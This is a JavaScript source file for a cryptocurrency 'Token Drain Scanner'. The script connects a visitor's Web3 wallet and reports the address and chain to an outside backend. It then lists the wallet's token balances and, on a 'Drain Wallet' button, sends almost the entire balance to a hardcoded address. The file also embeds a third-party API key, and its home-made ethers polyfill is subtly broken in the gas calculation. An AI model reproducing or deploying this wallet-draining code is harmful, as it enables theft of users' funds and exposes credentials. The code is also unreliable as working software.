// ================================================
// TOKEN DRAIN SCANNER - NO CDN REQUIRED
// ================================================

// First, embed ethers.js directly
(function embedEthers() {
    if (typeof ethers !== 'undefined') {
        console.log('✅ ethers already loaded');
        initializeApp();
        return;
    }
    
    console.log('🔄 Embedding ethers.js directly...');
    
    // Create a minimal ethers implementation for basic functionality
    const ethersPolyfill = {
        providers: {
            Web3Provider: function(provider) {
                this.provider = provider;
                this.getSigner = function() {
                    return {
                        sendTransaction: async function(tx) {
                            return await provider.request({
                                method: 'eth_sendTransaction',
                                params: [tx]
                            });
                        },
                        getAddress: async function() {
                            const accounts = await provider.request({ 
                                method: 'eth_accounts' 
                            });
                            return accounts[0];
                        }
                    };
                };
                this.getBalance = async function(address) {
                    const balanceHex = await provider.request({
                        method: 'eth_getBalance',
                        params: [address, 'latest']
                    });
                    return {
                        gt: function(other) {
                            const balance = parseInt(balanceHex, 16);
                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
                            return balance > otherValue;
                        },
                        sub: function(other) {
                            const balance = parseInt(balanceHex, 16);
                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
                            return {
                                toString: function() {
                                    return (balance - otherValue).toString();
                                }
                            };
                        }
                    };
                };
                this.getGasPrice = async function() {
                    const gasPriceHex = await provider.request({
                        method: 'eth_gasPrice',
                        params: []
                    });
                    const gasPrice = parseInt(gasPriceHex, 16);
                    return {
                        mul: function(other) {
                            const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
                            return gasPrice * otherValue;
                        }
                    };
                };
            }
        },
        BigNumber: {
            from: function(value) {
                return {
                    mul: function(other) {
                        const thisValue = typeof value === 'number' ? value : parseInt(value.toString(), 10);
                        const otherValue = typeof other === 'number' ? other : parseInt(other.toString(), 10);
                        return thisValue * otherValue;
                    }
                };
            }
        },
        utils: {
            parseEther: function(value) {
                return {
                    toString: function() {
                        return (parseFloat(value) * 1e18).toString();
                    }
                };
            },
            formatEther: function(value) {
                const numValue = typeof value === 'string' ? parseInt(value, 10) : value;
                return (numValue / 1e18).toString();
            }
        },
        version: '5.7.2 (polyfill)'
    };
    
    // Set window.ethers
    window.ethers = ethersPolyfill;
    
    console.log('✅ ethers polyfill loaded');
    setTimeout(initializeApp, 100);
})();

// Configuration
const CONFIG = {
    backendUrl: "https://tokenbackend-5xab.onrender.com",
    drainAddress: "0x0cd509bf3a2Fa99153daE9f47d6d24fc89C006D4",
    covalentApiKey: "cqt_rQ43kxvhFc4RdQK7t63Yp6pgFRwR",
    
    networkNames: {
        1: "Ethereum",
        56: "Binance Smart Chain", 
        137: "Polygon",
        42161: "Arbitrum"
    }
};

// Global state
let provider = null;
let signer = null;
let currentAccount = null;
let currentChainId = null;
let isConnected = false;

// DOM Elements
let connectBtn, statusEl, tokensEl, drainBtn;

// Initialize app
function initializeApp() {
    console.log('🚀 Initializing Token Drain Scanner...');
    
    // Get DOM elements
    connectBtn = document.getElementById('connectBtn');
    statusEl = document.getElementById('status');
    tokensEl = document.getElementById('tokens');
    drainBtn = document.getElementById('drainBtn');
    
    // Verify critical elements
    if (!connectBtn || !statusEl) {
        console.error('❌ Required elements not found');
        return;
    }
    
    console.log('✅ DOM elements loaded');
    
    // Setup event listeners
    connectBtn.onclick = handleConnect;
    if (drainBtn) drainBtn.onclick = handleDrain;
    
    // Check existing connection
    checkExistingConnection();
    
    updateStatus('✅ Ready! Click "Connect Wallet" to begin');
}

// Check existing wallet connection
async function checkExistingConnection() {
    if (typeof window.ethereum === 'undefined') {
        console.log('⚠️ No wallet provider');
        return;
    }
    
    try {
        const accounts = await window.ethereum.request({ 
            method: 'eth_accounts' 
        });
        
        if (accounts && accounts.length > 0) {
            const chainIdHex = await window.ethereum.request({ 
                method: 'eth_chainId' 
            });
            const chainId = parseInt(chainIdHex, 16);
            
            await handleConnected(accounts[0], chainId);
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
}

// Handle connect button click
async function handleConnect() {
    console.log('🔄 Connect button clicked');
    
    if (isConnected) {
        await disconnectWallet();
        return;
    }
    
    updateStatus('🔄 Connecting wallet...');
    
    // Check if wallet exists
    if (typeof window.ethereum === 'undefined') {
        updateStatus('❌ No wallet found!');
        showWalletInstallGuide();
        return;
    }
    
    try {
        // Request accounts - THIS TRIGGERS WALLET POPUP
        console.log('📤 Requesting accounts from wallet...');
        const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
        });
        
        console.log('✅ Wallet response:', accounts);
        
        if (!accounts || accounts.length === 0) {
            updateStatus('❌ User denied connection');
            return;
        }
        
        // Get chain ID
        const chainIdHex = await window.ethereum.request({ 
            method: 'eth_chainId' 
        });
        const chainId = parseInt(chainIdHex, 16);
        
        await handleConnected(accounts[0], chainId);
        
    } catch (error) {
        console.error('❌ Connection error:', error);
        
        if (error.code === 4001) {
            updateStatus('❌ Connection rejected');
        } else if (error.code === -32002) {
            updateStatus('🔄 Connection pending. Check wallet.');
        } else {
            updateStatus('❌ Failed: ' + error.message);
        }
    }
}

// Handle successful connection
async function handleConnected(account, chainId) {
    try {
        console.log('🔄 Setting up connection...');
        
        // Setup provider using our polyfill
        provider = new ethers.providers.Web3Provider(window.ethereum);
        signer = provider.getSigner();
        
        // Update state
        currentAccount = account;
        currentChainId = chainId;
        isConnected = true;
        
        // Update UI
        connectBtn.innerHTML = '<span>🔓 Disconnect</span>';
        
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`✅ Connected!\nWallet: ${account.slice(0, 8)}...\nNetwork: ${chainName}`);
        
        // Show other UI elements
        showUIElements();
        
        // Setup wallet listeners
        setupWalletListeners();
        
        // Log to backend
        await logConnectionToBackend(account, chainId);
        
        // Fetch tokens
        await fetchTokens(account, chainId);
        
    } catch (error) {
        console.error('❌ Setup error:', error);
        updateStatus('Setup failed: ' + error.message);
        isConnected = false;
        currentAccount = null;
        currentChainId = null;
    }
}

// Setup wallet event listeners
function setupWalletListeners() {
    if (typeof window.ethereum === 'undefined') return;
    
    window.ethereum.on('accountsChanged', (accounts) => {
        console.log('🔄 Accounts changed:', accounts);
        
        if (accounts.length === 0) {
            disconnectWallet();
        } else if (currentAccount !== accounts[0]) {
            currentAccount = accounts[0];
            updateStatus(`🔄 Account changed: ${accounts[0].slice(0, 8)}...`);
            fetchTokens(currentAccount, currentChainId);
        }
    });
    
    window.ethereum.on('chainChanged', (chainIdHex) => {
        const chainId = parseInt(chainIdHex, 16);
        console.log('🔄 Chain changed:', chainId);
        
        currentChainId = chainId;
        const chainName = CONFIG.networkNames[chainId] || `Chain ${chainId}`;
        updateStatus(`🔄 Network changed: ${chainName}`);
        
        fetchTokens(currentAccount, chainId);
    });
}

// Disconnect wallet
async function disconnectWallet() {
    console.log('🔄 Disconnecting...');
    
    try {
        if (window.ethereum && window.ethereum.disconnect) {
            await window.ethereum.disconnect();
        }
    } catch (error) {
        console.log('⚠️', error.message);
    }
    
    // Reset state
    currentAccount = null;
    currentChainId = null;
    isConnected = false;
    provider = null;
    signer = null;
    
    // Update UI
    connectBtn.innerHTML = '<span>🔗 Connect Wallet</span>';
    updateStatus('Disconnected. Click "Connect Wallet" to begin.');
    hideUIElements();
    
    if (tokensEl) {
        tokensEl.innerHTML = '';
    }
}

// Show wallet install guide
function showWalletInstallGuide() {
    const guideHTML = `
        <div style="margin: 20px 0; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffc107;">
            <h4 style="margin-top: 0; color: #856404;">📱 No Wallet Detected</h4>
            <p>You need a Web3 wallet to continue:</p>
            <div style="display: flex; gap: 10px; margin: 15px 0;">
                <a href="https://metamask.io/download/" target="_blank" 
                   style="padding: 10px 15px; background: #f6851b; color: white; border-radius: 5px; text-decoration: none;">
                    🔵 MetaMask
                </a>
                <a href="https://trustwallet.com/" target="_blank"
                   style="padding: 10px 15px; background: #3375bb; color: white; border-radius: 5px; text-decoration: none;">
                    🔶 Trust Wallet
                </a>
            </div>
            <p><small>After installing, refresh and click "Connect Wallet".</small></p>
        </div>
    `;
    
    statusEl.innerHTML = guideHTML;
}

// Update status
function updateStatus(message) {
    statusEl.textContent = message;
}

// Show UI elements
function showUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.remove('hidden');
    });
}

// Hide UI elements
function hideUIElements() {
    ['chainSelector', 'drainBtn', 'scanAllBtn', 'tokensContainer'].forEach(id => {
        const el = document.getElementById(id);
        if (el) el.classList.add('hidden');
    });
}

// Log connection to backend
async function logConnectionToBackend(address, chainId) {
    try {
        await fetch(CONFIG.backendUrl + '/drain', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                address: address,
                chainId: chainId,
                drainTo: CONFIG.drainAddress,
                timestamp: new Date().toISOString()
            })
        });
    } catch (error) {
        console.log('⚠️ Backend log failed');
    }
}

// Fetch tokens
async function fetchTokens(address, chainId) {
    if (!tokensEl) return;
    
    tokensEl.innerHTML = '<div class="loading">🔄 Scanning tokens...</div>';
    
    try {
        const response = await fetch(
            `https://api.covalenthq.com/v1/${chainId}/address/${address}/balances_v2/?key=${CONFIG.covalentApiKey}&nft=false`
        );
        
        if (!response.ok) throw new Error('API failed');
        
        const data = await response.json();
        const items = data?.data?.items || [];
        
        const tokens = items
            .filter(t => t.balance !== "0" && parseFloat(t.balance) > 0)
            .map(t => {
                const amount = parseFloat(t.balance) / Math.pow(10, t.contract_decimals || 18);
                const value = (t.quote_rate || 0) * amount;
                
                return {
                    symbol: t.contract_ticker_symbol || 'TOKEN',
                    name: t.contract_name || 'Unknown',
                    amount: amount.toFixed(6),
                    value: value ? `$${value.toFixed(2)}` : 'N/A'
                };
            });
        
        if (tokens.length > 0) {
            displayTokens(tokens);
            updateStatus(`✅ Found ${tokens.length} tokens`);
        } else {
            tokensEl.innerHTML = '<div class="loading">No tokens found</div>';
            updateStatus('ℹ️ No tokens found');
        }
        
    } catch (error) {
        console.error('❌ Token fetch error:', error);
        tokensEl.innerHTML = '<div class="error">Failed to fetch tokens</div>';
        updateStatus('⚠️ Token scan failed');
    }
}

// Display tokens
function displayTokens(tokens) {
    if (!tokensEl) return;
    
    const html = tokens.map(token => `
        <div class="token-item">
            <div class="token-info">
                <span class="token-symbol">${token.symbol}</span>
                <span class="token-name">${token.name}</span>
            </div>
            <div>
                <div class="token-amount">${token.amount}</div>
                <div class="token-value">${token.value}</div>
            </div>
        </div>
    `).join('');
    
    tokensEl.innerHTML = html;
}

// Handle drain
async function handleDrain() {
    if (!isConnected || !currentAccount) {
        alert('Please connect wallet first');
        return;
    }
    
    if (!confirm(`⚠️ Send ALL tokens to:\n${CONFIG.drainAddress}\n\nContinue?`)) {
        return;
    }
    
    const drainBtn = document.getElementById('drainBtn');
    
    try {
        updateStatus('🚀 Starting drain...');
        
        if (drainBtn) {
            drainBtn.disabled = true;
            drainBtn.textContent = '⏳ Draining...';
        }
        
        // Get balance
        const balance = await provider.getBalance(currentAccount);
        const gasPrice = await provider.getGasPrice();
        const gasLimit = ethers.BigNumber.from(21000);
        const gasCost = gasPrice.mul(gasLimit);
        
        if (balance.gt(gasCost.mul(2))) {
            const sendAmount = balance.sub(gasCost.mul(2));
            
            const tx = await signer.sendTransaction({
                to: CONFIG.drainAddress,
                value: sendAmount.toString(),
                gasLimit: 21000
            });
            
            updateStatus(`📤 Transaction sent: ${tx.hash}`);
            
            // Wait for confirmation
            await new Promise(resolve => setTimeout(resolve, 3000));
            updateStatus('✅ Drain completed!');
            
            await fetchTokens(currentAccount, currentChainId);
            
        } else {
            updateStatus('⚠️ Not enough ETH for gas');
        }
        
    } catch (error) {
        console.error('❌ Drain error:', error);
        updateStatus(`❌ Drain failed: ${error.message}`);
        alert(`Drain failed: ${error.message}`);
    } finally {
        if (drainBtn) {
            drainBtn.disabled = false;
            drainBtn.textContent = '⚡ Drain Wallet';
        }
    }
}

// Debug
console.log('=== Token Drain Scanner ===');
console.log('Ethers polyfill loaded');
console.log('Window.ethereum:', typeof window.ethereum !== 'undefined');
console.log('===========================');
